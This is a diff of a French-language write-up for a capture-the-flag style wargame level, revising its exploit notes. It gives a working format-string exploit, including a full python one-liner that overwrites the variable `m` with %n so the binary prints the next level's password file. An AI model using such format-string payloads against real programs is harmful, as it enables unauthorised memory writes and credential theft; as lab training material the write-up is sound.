@@ -20,9 +20,9 @@
 
 ## Exploit
 
-- Même principe que level3 : adresse de `m` (4 octets) au début du buffer, puis format qui imprime **16930112** caractères de plus (4 + 16930112 = 16930116), puis **%k$n** (index à ajuster selon la VM, souvent 1, 4 ou 7).
-- **Attention :** la sortie fait ~16 Mo (padding), la commande peut prendre quelques secondes.
-- Une fois `m` écrit, le programme exécute **/bin/cat /home/user/level5/.pass** et affiche le mot de passe level5 directement (pas besoin de shell interactif).
+- Adresse de `m` (4 octets) au début du buffer, puis **%16930112x** puis **%k$n**. L’index **k** est celui dont le dump (`%1$p` … `%12$p`) affiche **0x41414141** (pointeur sur le buffer) ; sur l’ISO officielle **k = 12**.
+- Commande : `python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' | ./level4`. Sortie ~16 Mo ; le mot de passe level5 à la fin.
+- Une fois `m` écrit, le programme exécute **/bin/cat /home/user/level5/.pass** et affiche le mot de passe.
 
 ## Adresses utiles
 
